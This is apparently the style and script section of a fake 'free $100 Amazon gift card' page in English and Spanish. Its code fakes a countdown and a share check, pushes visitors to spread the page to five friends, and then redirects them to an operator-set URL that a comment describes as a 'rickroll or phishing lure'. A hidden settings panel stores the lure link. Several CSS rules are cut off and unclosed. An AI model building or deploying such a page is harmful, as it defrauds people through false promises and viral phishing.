        .giftcard-image::before {
            content: '';

            top: -50%;
            right: -50%;

            height: 200%;

        .giftcard-image::after {
            content: '';

        @keyframes shine {

        .share-btn {

            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            color: white;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        
        .share-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .share-btn:active {
            transform: translateY(0);
        }
        
        .claim-btn {
            width: 100%;
            padding: 20px;
            background: #999;
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 20px;
            font-weight: bold;
            cursor: not-allowed;
            opacity: 0.5;
            margin-top: 20px;
            transition: all 0.3s;
        }
        
        .claim-btn.active {
            cursor: pointer;
            opacity: 1;
            background: #FF9900;
            animation: glow 2s infinite;
        }
        
        @keyframes glow {
            0%, 100% { box-shadow: 0 0 20px rgba(255, 153, 0, 0.5); }
            50% { box-shadow: 0 0 30px rgba(255, 153, 0, 0.8); }
        }
        
        .share-count {
            font-size: 48px;
            font-weight: bold;
            color: #FF9900;
            margin: 10px 0;
        }
        
        .warning {
            background: #ffe5e5;
            border-left: 4px solid #ff4757;
            padding: 15px;
            margin-top: 30px;
            text-align: left;
            border-radius: 5px;
            display: none;
        }

        .hidden-settings {
            position: fixed;
            bottom: 10px;
            left: 10px;
            width: 30px;
            height: 30px;
            background: rgba(255,255,255,0.1);
            border-radius: 50%;
            cursor: pointer;
            z-index: 1000;
        }

        .settings-panel {
            display: none;
            position: fixed;
            bottom: 50px;
            left: 10px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.3);

        .settings-panel.show {

        .settings-panel input {

            border: 2px solid #ddd;
            border-radius: 5px;

        .settings-panel button {
            width: 100%;
            background: #FF9900;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }

        .settings-panel button:hover {

        }

        .settings-panel h4 {
            margin: 0 0 10px 0;
            color: #232F3E;
            font-size: 16px;
        }

        .settings-panel p {
            margin: 0 0 10px 0;

            color: #666;
        }
        
        .warning.show {
            display: block;
            animation: slideDown 0.5s;
        }
        
        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .warning h3 {
            color: #ff4757;
            margin-bottom: 10px;
            font-size: 18px;
        }
        
        .warning ul {
            margin-left: 20px;

        }
        
        .spinner {
            display: none;
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #FF9900;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }


    </style>
</head>
<body>

    <script>
        // ‚¨áÔ∏è‚¨áÔ∏è‚¨áÔ∏è PUT YOUR LINK HERE ‚¨áÔ∏è‚¨áÔ∏è‚¨áÔ∏è
        const REDIRECT_URL = 'https://www.amazon.com/';
        // Example: const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        // ‚¨ÜÔ∏è‚¨ÜÔ∏è‚¨ÜÔ∏è PUT YOUR LINK HERE ‚¨ÜÔ∏è‚¨ÜÔ∏è‚¨ÜÔ∏è
        
        let shareCount = 0;
        let timeLeft = 600; // 10 minutes
        let shareTimer = null;
        let hasShared = false;
        let currentLang = 'en';
        
        // Translations
        const translations = {
            en: {
                badge: 'LIMITED',
                mainTitle: 'üéâ FREE GIFT CARD! üéâ',
                giftcardLabel: 'DIGITAL CODE',
                giftcardType: 'GIFT CARD',
                subtitle: 'Amazon Gift Card - Yours FREE!',
                timerText: 'Hurry! Offer expires in:',
                shareText: 'Share with 5 friends to unlock your gift card!',
                shareBtnText: 'üì§ Share to Unlock',
                shareBtnVerifying: '‚è≥ Verifying share...',
                shareBtnVerified: '‚úÖ Share Verified!',
                claimBtnText: 'üîí CLAIM YOUR $100 GIFT CARD',
                claimBtnActive: 'üéÅ CLAIM YOUR $100 GIFT CARD NOW!',
                claimBtnProcessing: 'Processing...',
                shareMessage: 'Look! I found this free $100 Amazon gift card! Claim yours now before it expires! üéÅ\n'
            },
            es: {
                badge: 'LIMITADO',
                mainTitle: 'üéâ ¬°TARJETA REGALO GRATIS! üéâ',
                giftcardLabel: 'C√ìDIGO DIGITAL',
                giftcardType: 'TARJETA REGALO',
                subtitle: '¬°Tarjeta Regalo de Amazon - Tuya GRATIS!',
                timerText: '¬°Ap√∫rate! La oferta expira en:',
                shareText: '¬°Comparte con 5 amigos para desbloquear tu tarjeta regalo!',
                shareBtnText: 'üì§ Compartir para Desbloquear',
                shareBtnVerifying: '‚è≥ Verificando...',
                shareBtnVerified: '‚úÖ ¬°Compartido Verificado!',
                claimBtnText: 'üîí RECLAMA TU TARJETA DE $100',
                claimBtnActive: 'üéÅ ¬°RECLAMA TU TARJETA DE $100 AHORA!',
                claimBtnProcessing: 'Procesando...',
                shareMessage: '¬°Mira! ¬°Encontr√© esta tarjeta de regalo gratis de Amazon de $100! ¬°Reclama la tuya antes de que expire! üéÅ\n\n'
            }
        };
        
        // Save lure URL
        function saveLureUrl() {
            const url = document.getElementById('lureUrl').value;
            if (url) {
                testLureUrl = url;
                document.getElementById('savedMsg').style.display = 'block';
                setTimeout(() => {
                    document.getElementById('savedMsg').style.display = 'none';
                }, 3000);
            }
        }
        
        // Set language function
        function setLanguage(lang) {
            currentLang = lang;
            
            // Update active button
            document.getElementById('langEn').classList.remove('active');
            document.getElementById('langEs').classList.remove('active');
            document.getElementById('lang' + lang.charAt(0).toUpperCase() + lang.slice(1)).classList.add('active');
            
            // Update all text
            const t = translations[lang];
            document.getElementById('badge').textContent = t.badge;
            document.getElementById('mainTitle').textContent = t.mainTitle;
            document.getElementById('giftcardLabel').textContent = t.giftcardLabel;
            document.getElementById('giftcardType').textContent = t.giftcardType;
            document.getElementById('subtitle').textContent = t.subtitle;
            document.getElementById('timerText').textContent = t.timerText;
            document.getElementById('shareText').textContent = t.shareText;
            
            // Update button text only if not in progress
            if (!hasShared) {
                document.getElementById('shareBtnText').textContent = t.shareBtnText;
            }
            if (shareCount < 5) {
                document.getElementById('claimBtnText').textContent = t.claimBtnText;
            }
        }
        
        // Countdown timer
        const timerInterval = setInterval(() => {
            timeLeft--;
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            document.getElementById('countdown').textContent = 
                `${minutes}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                document.getElementById('countdown').textContent = currentLang === 'en' ? 'EXPIRED!' : '¬°EXPIRADO!';
            }
        }, 1000);
        
        // Share link function (opens native share menu)
        function shareLink() {
            if (hasShared) return;
            
            const t = translations[currentLang];
            
            // Create the share message with URL
            const shareText = t.shareMessage + window.location.href;
            
            // Check if Web Share API is available (mobile devices)
            if (navigator.share) {
                navigator.share({
                    title: currentLang === 'en' ? 'FREE $100 Amazon Gift Card!' : '¬°Tarjeta Regalo de Amazon de $100 GRATIS!',
                    text: shareText,
                    url: window.location.href
                }).then(() => {
                    console.log('Shared successfully');
                }).catch((error) => {
                    console.log('Error sharing:', error);
                    // Fallback to clipboard
                    fallbackCopy(shareText);
                });
            } else {
                // Fallback for desktop: copy to clipboard
                fallbackCopy(shareText);
            }
            
            // Mark as shared
            hasShared = true;
            
            // Visual feedback
            const btn = document.getElementById('shareBtn');
            document.getElementById('shareBtnText').textContent = t.shareBtnVerifying;
            btn.style.opacity = '0.7';
            btn.style.cursor = 'wait';
            
            // Auto-unlock after 10 seconds
            shareTimer = setTimeout(() => {
                shareCount = 5;
                updateProgress();
                document.getElementById('shareBtnText').textContent = t.shareBtnVerified;
                btn.style.background = '#00b894';
                btn.style.cursor = 'not-allowed';
            }, 10000);
        }
        
        // Fallback copy to clipboard function
        function fallbackCopy(text) {
            const textArea = document.createElement('textarea');
            textArea.value = text;
            textArea.style.position = 'fixed';
            textArea.style.left = '-999999px';
            document.body.appendChild(textArea);
            textArea.select();
            try {
                document.execCommand('copy');
                alert(currentLang === 'en' ? 'Link copied! Share it with friends!' : '¬°Enlace copiado! ¬°Comp√°rtelo con amigos!');
            } catch (err) {
                console.error('Could not copy text: ', err);
            }
            document.body.removeChild(textArea);
        }
        
        // Update progress bar
        function updateProgress() {
            const percentage = (shareCount / 5) * 100;
            document.getElementById('progress').style.width = percentage + '%';
            document.getElementById('progress').textContent = `${shareCount}/5`;
            document.getElementById('shareCount').textContent = `${shareCount}/5`;
            
            if (shareCount >= 5) {
                const t = translations[currentLang];
                const claimBtn = document.getElementById('claimBtn');
                claimBtn.classList.add('active');
                claimBtn.style.cursor = 'pointer';
                document.getElementById('claimBtnText').textContent = t.claimBtnActive;
            }
        }
        
        // Attempt to claim
        function attemptClaim() {
            if (shareCount >= 5) {
                const t = translations[currentLang];
                
                // Show spinner
                document.getElementById('spinner').style.display = 'block';
                document.getElementById('claimBtnText').textContent = t.claimBtnProcessing;
                
                setTimeout(() => {
                    document.getElementById('spinner').style.display = 'none';
                    
                    // Redirect to the link (rickroll or phishing lure)
                    if (REDIRECT_URL && REDIRECT_URL !== 'https://www.youtube.com/watch?v=dQw4w9WgXcQ') {
                        window.location.href = REDIRECT_URL;
                    }
                }, 2000);
            }
        }
    </script>
